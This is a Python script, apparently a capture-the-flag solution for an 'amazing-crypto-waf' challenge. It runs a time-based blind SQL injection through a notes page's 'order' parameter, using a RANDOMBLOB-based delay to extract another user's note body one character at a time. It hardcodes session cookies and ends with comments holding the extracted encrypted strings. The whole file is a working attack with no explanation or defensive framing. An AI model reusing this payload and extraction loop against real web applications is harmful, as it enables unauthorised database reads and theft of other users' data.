import requests
import urllib.parse
import time
import string

normal_user_cookies = {
    "session": "b59fc20c4e4348cba73ddfc96540a687.e1942e47cc4fca6b77ad35f48ac1daa86654f64401aa16ae4b685e0470b0dc1c"
}

flagger_cookies = {
    'session': 'f9ebb27d5fad48fa803823bf828bd3d8.98029c2abfa3f7e6fedfd70f22a41ae3ce8ce73db0867143857eadc12f297b54'
}

flag_enc_format = "ENCRYPT:"
url = "https://7b000000e311a2c8ecec3be9-amazing-crypto-waf.challenge.master.allesctf.net:31337/notes%3F"

for x in range(len(flag_enc_format) +1, 200):
    for i in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        t1 = time.time()
        payload = "asc,(CASE WHEN (select substr((select body from notes where user=(select uuid from users where username='flagger')),"+str(x)+",1) = '"+str(i)+"') THEN 69=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) ELSE timestamp END) desc#"
        params = urllib.parse.urlencode({"order": payload})
        resp = requests.get(url+params, cookies=flagger_cookies)
        t2 = time.time()
        if (t2 - t1 ) > 0.9:
            flag_enc_format += i
            break
    
    print (flag_enc_format)
# ENCRYPT:K3lYMUdNTHZtZnFISFlZN0RNRmo4Zz09OlE1SmhaUE8xWU5CanpxbjM6OE9kcDNwUnF3aFJ5VDBRekxRZG1LQT09
#ENCRYPT:SzJEVHVzRmhHaHZmU2pYak0yQVZzQT09OmUzOVBwcXNVWWdhMEw0YXpCVDV2WHRwYnBPRXFaSVpqMFpQRk1BMXNzODE1UGxIUXhwb0hLY2diNGd2VTRYYz06REpPTWk0S01pdmZ3cXVxNFBGcklTdz09
